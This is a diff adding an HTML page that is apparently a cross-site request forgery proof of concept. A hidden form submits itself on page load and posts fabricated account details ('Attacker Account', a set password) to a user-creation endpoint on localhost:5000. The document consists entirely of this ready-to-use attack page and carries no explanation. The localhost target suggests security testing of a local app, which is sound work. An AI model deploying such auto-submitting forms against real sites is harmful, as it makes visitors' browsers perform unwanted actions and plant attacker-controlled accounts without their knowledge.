@@ -1,0 +1,11 @@
+
+<html>
+  <body onload="document.forms[0].submit()">
+    <form action="https://localhost:5000/api/user/create" method="POST">
+      <input type="hidden" name="fullName" value="Attacker Account">
+      <input type="hidden" name="email" value="attacker@example.com">
+      <input type="hidden" name="phone" value="9999999999">
+      <input type="hidden" name="password" value="P@ssword123">
+    </form>
+  </body>
+</html>
